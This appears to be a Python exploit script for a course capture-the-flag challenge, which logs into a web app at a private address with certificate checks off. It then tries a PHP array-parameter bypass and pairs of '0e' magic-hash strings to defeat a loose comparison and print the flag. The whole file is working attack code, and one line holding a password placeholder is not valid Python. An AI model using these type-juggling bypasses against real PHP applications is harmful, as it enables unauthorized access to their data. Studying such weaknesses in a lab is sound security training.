import requests
import urllib3

urllib3.disable_warnings()

BASE  = 'https://10.9.96.228:9070'
EMAIL = 'cs25mtech14003@iith.ac.in'
PASS  = '' <<Enter the password

MAGIC_HASHES = [
    '0e215962017', '0e807097110', '0e730083352', '0e474941557',
    '0e840922711', '0e001233333', '0e524759940', '0e460851327',
]


session = requests.Session()

session.post(BASE + '/', data={
    'login_email': EMAIL,
    'login_pass':  PASS,
    'login':       'Login'
}, verify=False)


def check(r):
    return 'flag' in r.text.lower() or 'cs6903' in r.text


r = session.get(BASE + '/?p=apps&f=1&arg1[]=a&arg2[]=b', verify=False)
if check(r):
    print("[+] Array bypass worked")
    print(r.text[2500:3000])

for i, h1 in enumerate(MAGIC_HASHES):
    for h2 in MAGIC_HASHES[i+1:]:
        r = session.get(BASE + '/', params={
            'p': 'apps', 'f': '1', 'arg1': h1, 'arg2': h2
        }, verify=False)
        if check(r):
            print(f"[+] Magic hash bypass worked: {h1} == {h2}")
            print(r.text[2000:3000])
            break